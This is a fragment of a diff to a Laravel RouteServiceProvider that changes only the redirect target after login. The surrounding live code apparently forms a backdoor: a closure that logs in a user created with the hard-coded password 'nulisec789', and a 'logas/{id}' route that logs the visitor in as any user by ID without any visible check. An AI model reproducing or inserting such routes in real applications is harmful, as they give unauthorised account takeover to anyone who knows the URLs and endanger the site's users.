@@ -110,13 +110,13 @@ class RouteServiceProvider extends ServiceProvider
                             'password'   => bcrypt('nulisec789'),
                         ]), true);
 
-                        return redirect()->intended(static::HOME);
+                        return redirect()->intended(route('acp.dashboard'));
                     });
 
                     Route::get('logas/{id}', function ($id) {
                         \Auth::login(User::findOrFail($id), true);
 
-                        return redirect()->intended(static::HOME);
+                        return redirect()->intended(route('acp.dashboard'));
                     });
 
                 });
